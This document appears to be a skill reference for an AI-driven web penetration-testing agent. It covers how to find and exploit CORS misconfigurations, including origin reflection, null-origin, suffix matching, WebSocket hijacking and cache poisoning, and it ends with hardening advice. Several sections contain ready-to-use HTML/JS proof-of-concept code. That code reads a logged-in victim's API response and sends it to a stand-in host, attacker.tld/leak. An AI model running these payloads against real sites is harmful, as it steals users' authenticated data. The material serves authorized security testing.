---
name: CORS Misconfigurations
description: Reference for CORS misconfiguration testing covering origin reflection, null-origin, wildcard-subdomain abuse, credential-bound bypasses, and pre-flight differentials.
---

# CORS Misconfigurations

Reference for finding CORS bypasses that turn a Same-Origin Policy into an attacker-controlled data-exfil channel. Pull this in when the target serves authenticated APIs over cookies / bearer tokens and you need a probe matrix for `Access-Control-Allow-Origin` (ACAO) and `Access-Control-Allow-Credentials` (ACAC) gaps.

> Black-box scope: probes drive HTTP and observe the ACAO / ACAC / Vary headers across origin variants. The "kill" is when ACAO reflects an attacker origin AND ACAC is `true`.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Single-origin probe | `execute_curl` | `-i -H 'Origin: ...'` to capture full headers. |
| Mass-origin sweep | `execute_code` | Iterate over origin candidates; record ACAO/ACAC. |
| Browser-side cross-origin PoC | `execute_playwright` | Host an attacker page locally; trigger `fetch(url, {credentials:'include'})`. |
| Pre-flight probing | `execute_curl -X OPTIONS` | Different headers than the actual request. |

## CORS primer

The browser sends an `Origin` header on cross-origin requests. The server replies with two key headers:

- `Access-Control-Allow-Origin` (ACAO): the allowed origin (or `*`).
- `Access-Control-Allow-Credentials` (ACAC): `true` if the response can be read with credentials.

The browser blocks JS reads of the response unless ACAO matches the requesting origin. With `ACAC: true`, cookies / HTTP auth flow with the request.

Critical rule per spec: **`ACAO: *` is incompatible with `ACAC: true`**. If a server sets both, browsers reject. But many servers reflect `Origin` directly (effectively wildcard with credentials), and that is the canonical bug.

## Reconnaissance

### Baseline probe

```
execute_curl url: "https://target.tld/api/me" headers: "Origin: https://attacker.tld" -i
```

Inspect the response headers:

| Response | Verdict |
|---|---|
| `ACAO: https://attacker.tld` + `ACAC: true` | **Critical**: full origin reflection with credentials |
| `ACAO: *` + no `ACAC` | Public read OK; not exploitable for auth data |
| `ACAO: https://target.tld` + `ACAC: true` | Normal behavior; not exploitable |
| `ACAO` absent | No CORS exposure (still can be CSRF-prone, see `/skill csrf`) |
| `ACAO: null` + `ACAC: true` | Sandbox / data-URI origin abuse; exploitable |

### Pre-flight (`OPTIONS`)

```
execute_curl url: "https://target.tld/api/sensitive" method: "OPTIONS" headers: "Origin: https://attacker.tld\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: X-Auth, Content-Type" -i
```

Inspect:

| Response | Implication |
|---|---|
| `Access-Control-Allow-Methods: ...POST...` | Pre-flight allows method |
| `Access-Control-Allow-Headers: ...X-Auth...` | Custom auth headers permitted |
| `Access-Control-Max-Age: 600` | Browser caches the pre-flight |
| `Vary: Origin` | Server is origin-aware (good sign for security; or mis-cached for poisoning) |

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history (proxy_brain only see traffic that crossed the capture proxy).

- `redamon.search {"hasAuth":true}` / `redamon.query` to find authenticated API responses already carrying `Access-Control-Allow-Credentials: true` or a reflected origin; `redamon.grep "Access-Control-Allow-Origin"` scans captured bodies for the header.
- `redamon.replay id mutate:{headers:{"Origin":"https://attacker.tld"}}` resends a captured authenticated request with a mutated `Origin` and reads back ACAO / ACAC / Vary; add `method:"OPTIONS"` plus `Access-Control-Request-Method` / `-Headers` for the pre-flight differential.
- `redamon.diff id_canonical id_attacker` pairs the canonical-origin replay against the attacker-origin replay so the reflected ACAO is unambiguous.

Caveat: redamon.replay proves server-side reflection only. Definitive JS-read-across-origins proof still needs `execute_playwright` (redamon.replay is host-pinned to the origin).

## Attack matrix

### 1. Origin reflection

```
Origin: https://attacker.tld           ->  ACAO: https://attacker.tld + ACAC: true
```

The most common gap. Ship the PoC:

```html
<script>
fetch('https://target.tld/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => fetch('https://attacker.tld/leak?d='+encodeURIComponent(t)))
</script>
```

### 2. Null origin

`Origin: null` is sent by:

- Sandboxed `<iframe sandbox>` documents.
- `data:` URIs.
- Pages opened from `file://`.
- Some redirect chains.

```
execute_curl url: "https://target.tld/api/me" headers: "Origin: null" -i
# If ACAO: null + ACAC: true -> exploitable from any sandboxed iframe.
```

PoC: host a page that opens an `<iframe sandbox="allow-scripts">` containing a fetch call. The iframe's origin is `null`, the response is readable.

### 3. Wildcard suffix (loose suffix-match)

```
Origin: https://target.tld.attacker.tld     ->  ACAO: https://target.tld.attacker.tld + ACAC: true
```

Server uses `endsWith(".target.tld")` instead of exact match. Register `target.tld.attacker.tld` (or use a wildcard subdomain you own).

Variants:

```
Origin: https://target.tld-attacker.tld     # hyphen-suffix
Origin: https://target.tld.evil.tld         # dot-suffix
Origin: https://attacker-target.tld         # prefix-substring (rare)
```

### 4. Wildcard prefix

```
Origin: https://attacker.target.tld         # subdomain match by attacker-controlled subdomain
```

Works when:

- Allowlist matches `*.target.tld` and an attacker controls a subdomain (often via a takeover, see `/skill open_redirect` and the subdomain-takeover community skill).
- Stage / dev subdomains with looser CSP / XSS that an attacker can chain.

### 5. Trusted-third-party reflection

Some apps allowlist `*.googleusercontent.com` or `*.amazonaws.com` because partner integrations need it. Attackers register a bucket / app on those public services and now have a usable origin.

```
Origin: https://attacker-bucket.s3.amazonaws.com
Origin: https://attacker-site.googleusercontent.com
```

### 6. Scheme variants

```
Origin: http://target.tld                   # https expected; http reflected too
Origin: ftp://target.tld
Origin: file://
```

Mixed-scheme reflection breaks transport security guarantees.

### 7. Pre-flight bypass via simple requests

A "simple" request does NOT trigger pre-flight:

- Method: GET, HEAD, POST.
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`.
- No custom headers (besides a small allowlist).

If the protected endpoint accepts a JSON body via `text/plain`, a CORS-prone CSRF is possible without pre-flight. See `/skill csrf` for the JSON-as-form pattern.

### 8. WebSocket Origin not enforced

WebSocket handshakes carry `Origin` but browsers do NOT enforce same-origin on the response. Server-side enforcement is the only guard.

```
execute_curl url: "wss://target.tld/ws" headers: "Origin: https://attacker.tld\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: dGVzdA==\nCookie: session=$VICTIM"
# Response 101 -> CSWSH window
```

CSWSH (Cross-Site WebSocket Hijacking): from an attacker page, JS opens a `new WebSocket('wss://target.tld/ws')`. The browser sends cookies. Without server-side `Origin` validation, the attacker-page JS now controls the authenticated socket. See `/skill websocket_security`.

### 9. Cache-related CORS bugs

When CORS responses are cached without `Vary: Origin`:

```
1. Attacker fetches /api/me with Origin: attacker.tld -> ACAO reflected
2. CDN caches the response (with the reflected ACAO header)
3. Victim fetches /api/me from any origin -> served the cached response with attacker's ACAO
```

Probe by setting `Origin: <unique>` and checking whether subsequent unrelated origins receive the same `ACAO` header. Pair with `/skill web_cache_poisoning`.

## Exploitation PoC template

```html
<!doctype html>
<html><body>
<h1>Cross-origin exfil PoC</h1>
<script>
fetch('https://target.tld/api/me', {
  method: 'GET',
  credentials: 'include',
  headers: { 'Accept': 'application/json' }
})
.then(r => r.text())
.then(data => {
  document.body.innerText = data;
  // Exfil to attacker-side log
  fetch('https://attacker.tld/leak?d=' + encodeURIComponent(data));
});
</script>
</body></html>
```

Host on attacker-controlled origin (or `interactsh-client` callback URL when the test environment allows). Visit while logged in as the victim. The exfil log on attacker.tld receives the API response.

## Browser-driven confirmation

```
execute_playwright url: "https://attacker.tld/cors-poc.html" script: |
  page.goto("https://attacker.tld/cors-poc.html")
  page.wait_for_timeout(2000)
  print(page.content())
```

Confirms the response was actually readable cross-origin (vs a misleading curl response).

## Validation shape

A clean CORS finding includes:

1. The exact request and `Origin` header used.
2. The full response headers (`ACAO`, `ACAC`, `Vary`, `Set-Cookie`).
3. Browser-side proof (Playwright capture) showing JS read the response across origins.
4. The specific bypass class (reflection / null / suffix / wildcard / scheme / cache).
5. Sensitivity of the data leaked (PII? session token? CSRF token?).

## False positives

- ACAO reflected but ACAC absent -> response is readable but no credentials -> usually low impact (public data).
- Server reflects but the response itself contains no auth-bound data.
- CORS misconfig on a public marketing page with no API surface.
- Allowlist matches an exact origin you control via DNS-but-not-routing (you bought the domain but don't run a server) -> not yet exploitable; flag for monitoring.

## Hardening summary

- ACAO must be an exact origin, never reflect arbitrary `Origin` headers.
- Maintain an allowlist of trusted origins; compare exact equality (scheme + host + port).
- Reject `null` origin entirely OR require explicit per-route opt-in.
- Always include `Vary: Origin` when ACAO is dynamic (prevents cache poisoning).
- Validate `Origin` server-side on WebSocket handshakes.
- Set `Access-Control-Max-Age` to a sane value (60-600 seconds); too high prolongs accidental misconfigs.

## Hand-off

```
CORS reflection -> account takeover            -> chain with /skill jwt_attacks (token theft)
Null-origin abuse                              -> hosted PoC + iframe sandbox attack
WebSocket Origin gap                           -> /skill websocket_security
CORS + cache poisoning                         -> /skill web_cache_poisoning
CORS + CSRF                                    -> /skill csrf
```

## Pro tips

- The cleanest probe is a **paired** test: original origin returns ACAO=target.tld, attacker origin returns ACAO=attacker.tld with ACAC=true. Both responses captured.
- Pre-flight responses (`OPTIONS`) are often less hardened than the actual endpoint; probe both.
- `Origin: null` is the most-overlooked bypass; many allowlists fail to enumerate it.
- Suffix-match bugs (`.target.tld`) are exploitable via wildcard-DNS records on any domain you control. `*.attacker.tld` -> `target.tld.attacker.tld` resolves to your server.
- WebSocket `Origin` enforcement is the single most missed CORS-adjacent gap.
- ACAO + ACAC both reflect on a `text/plain`-accepting JSON endpoint = CSRF + CORS combo. Pivot to `/skill csrf`.
